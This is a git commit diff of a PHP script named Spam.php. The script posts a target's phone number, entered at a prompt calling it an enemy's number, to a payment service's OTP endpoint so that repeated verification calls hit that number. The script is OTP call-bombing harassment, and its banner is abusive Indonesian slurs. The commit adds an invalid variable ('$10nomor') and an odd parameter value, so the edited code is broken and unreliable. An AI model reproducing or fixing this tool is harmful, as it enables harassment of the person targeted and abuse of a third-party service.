a8f3e410e0152dce48b1a5c8878b06a1dde64330
Rahul4960 <57430177+Rahul4960@users.noreply.github.com>
2019-11-10 11:47:44 +0800

    Update Spam.php

--- Spam.php
+++ Spam.php
@@ -1,6 +1,5 @@
 <?php
 # echo "CallAndreas5"
-// Jangan Batasi Telpon Setiap Satu Nomor
 function send($phone){
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
@@ -9,7 +8,7 @@ function send($phone){
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_HEADER, true);
         curl_setopt($ch, CURLOPT_POST, 10);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=10call");                        $asw = curl_exec($ch);
         curl_close($ch);
                 echo $asw."\n";
 }
@@ -18,7 +17,7 @@ function send($phone){
 echo "Lo Ngapain Di Script Gua Babi ? Jangan Tau Make Aja Babi Lu Tau Memek Gak ? Itu Kesukaan Gua Anjing ; SGBTEAM\n\n";
 echo "NomorMusuhAnjing\nLoTauInputGakBabi? : ";
 $nomor = trim(fgets(STDIN));
-$execute = send($nomor);
+$execute = send($10nomor);
 print $execute;
 # echo "terkirim mampusssssd"
 ?>
